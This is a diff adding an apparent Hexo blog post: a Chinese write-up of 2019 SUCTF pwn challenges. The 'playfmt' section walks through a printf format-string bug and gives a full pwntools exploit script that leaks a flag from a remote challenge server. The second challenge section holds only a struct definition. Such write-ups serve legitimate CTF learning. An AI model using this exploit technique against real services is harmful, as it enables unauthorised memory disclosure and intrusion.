@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019-SUCTF-pwn - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#playfmt"><span class="toc-text">playfmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二手破电脑"><span class="toc-text">二手破电脑</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019-SUCTF-pwn
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-08-18 22:05:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="playfmt"><a href="#playfmt" class="headerlink" title="playfmt"></a>playfmt</h2><p>出了个简单的pwn,开启了RELRO和NX保护</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜➜ suctf  checksec --file playfmt </span><br><span class="line">[*] <span class="string">'/root/ctf/suctf/playfmt'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>main函数中，首先打开文件<code>flag.txt</code>，读出来16个字节的flag，然后进行三次<code>testing</code>（并不知道这是什么操作，但是这部分没有影响），调用logo函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  derived *v3; <span class="comment">// ebx</span></span><br><span class="line">  derived *v4; <span class="comment">// ebx</span></span><br><span class="line">  derived *v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [esp+0h] [ebp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  v8 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">16u</span>);</span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"open flag error , please contact the administrator!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fscanf</span>(stream, <span class="string">"%s"</span>, v8);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Testing my C++ skills..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 1..."</span>);</span><br><span class="line">  v3 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v3);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v3)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 2..."</span>);</span><br><span class="line">  v4 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v4);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v4)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 3..."</span>);</span><br><span class="line">  v5 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v5, v8);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You think I will leave the flag?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    base::~base(v5);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v5)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = Get_return_addr();</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">if</span> ( Get_return_addr() != v6 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>logo函数中,调用了<code>do_fmt</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bool logo(void)</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST1C_4</span><br><span class="line">  bool result; // al</span><br><span class="line"></span><br><span class="line">  v0 = Get_return_addr();</span><br><span class="line">  puts(&quot;=====================&quot;);</span><br><span class="line">  puts(&quot;  Magic echo Server&quot;);</span><br><span class="line">  puts(&quot;=====================&quot;);</span><br><span class="line">  do_fmt();</span><br><span class="line">  result = Get_return_addr() != v0;</span><br><span class="line">  if ( result )</span><br><span class="line">    exit(0);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>do_fmt</code>函数中，循环读入200字节的数据，存在格式化字符串漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>动态调式，让程序停在printf，观察此时栈上的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffcff0 —▸ 0x804b040 (buf) ◂— <span class="string">'aaaaaaaa\n'</span></span><br><span class="line">01:0004│      0xffffcff4 —▸ 0x8048cac ◂— jno    0x8048d23 /* <span class="string">'quit'</span> */</span><br><span class="line">02:0008│      0xffffcff8 ◂— 0x4</span><br><span class="line">03:000c│      0xffffcffc —▸ 0x80488e8 (logo()+59) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd000 —▸ 0x8048cb1 ◂— cmp    eax, 0x3d3d3d3d /* <span class="string">'====================='</span> */</span><br><span class="line">05:0014│      0xffffd004 —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0xfffd82e8</span><br><span class="line">06:0018│ ebp  0xffffd008 —▸ 0xffffd028 —▸ 0xffffd058 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd00c —▸ 0x80488f0 (logo()+67) —▸ 0xffff56e8 ◂— 0x0</span><br><span class="line">08:0020│      0xffffd010 —▸ 0xf7e3e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">... ↓</span><br><span class="line">0a:0028│      0xffffd018 —▸ 0xffffd058 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffd01c —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0xfffd82e8</span><br><span class="line">0c:0030│      0xffffd020 —▸ 0xf7e3ed60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">0d:0034│      0xffffd024 ◂— 0x0</span><br><span class="line">0e:0038│      0xffffd028 —▸ 0xffffd058 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd02c —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0xfffd82e8</span><br><span class="line">10:0040│      0xffffd030 —▸ 0xf7e3e3dc (__exit_funcs) —▸ 0xf7e3f1e0 (initial) ◂— 0x0</span><br><span class="line">11:0044│      0xffffd034 ◂— 0x0</span><br><span class="line">12:0048│      0xffffd038 —▸ 0x8050a28 —▸ 0xf7e3e7b0 (main_arena+48) —▸ 0x8050e60 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd03c —▸ 0x8050e30 ◂— 0x0</span><br></pre></td></tr></table></figure>
+<p>相对格式化字符串便宜为6处存在一个指向栈上的指针<code>ebp  0xffffd008 —▸ 0xffffd028 —▸ 0xffffd058 ◂— 0x0</code></p>
+<p>相对格式化字符串便宜为18处存在一个chunk指针，而我们的flag就在chunk中，我们可以通过格式化字符串修改这个chunk的地址后2位数值为flag所在的chunk的地址即可</p>
+<p>再利用<code>%18$s</code>打印出来，即可获取到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># r = process("./playfmt")</span></span><br><span class="line">r = remote(<span class="string">"120.78.192.35"</span>,<span class="number">9999</span>)</span><br><span class="line">r.recvuntil(<span class="string">"=====================\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"  Magic echo Server\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"=====================\n"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">stack_addr1 = eval(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>))</span><br><span class="line">log.info(<span class="string">"stack_addr_1 : "</span>+hex(stack_addr1))</span><br><span class="line">target = stack_addr1+<span class="number">4</span>*<span class="number">4</span></span><br><span class="line">log.info(<span class="string">"target:"</span>+hex(target))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"%18$p"</span>)</span><br><span class="line">heap_addr = eval(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>))</span><br><span class="line">log.info(<span class="string">"heap_addr : "</span>+hex(heap_addr))</span><br><span class="line">flag_addr = heap_addr<span class="number">-24</span></span><br><span class="line">log.info(<span class="string">"flag_addr : "</span>+hex(flag_addr))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"%"</span>+str(int(target&amp;<span class="number">0xffff</span>))+<span class="string">"c%6$hn"</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"%"</span>+str(int(flag_addr&amp;<span class="number">0xffff</span>))+<span class="string">"c%14$hn"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"%18$s"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"flag"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="二手破电脑"><a href="#二手破电脑" class="headerlink" title="二手破电脑"></a>二手破电脑</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct heap_list&#123;</span><br><span class="line">	char *comment_heap;</span><br><span class="line">	char *name_heap;</span><br><span class="line">	int price;</span><br><span class="line">	int score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
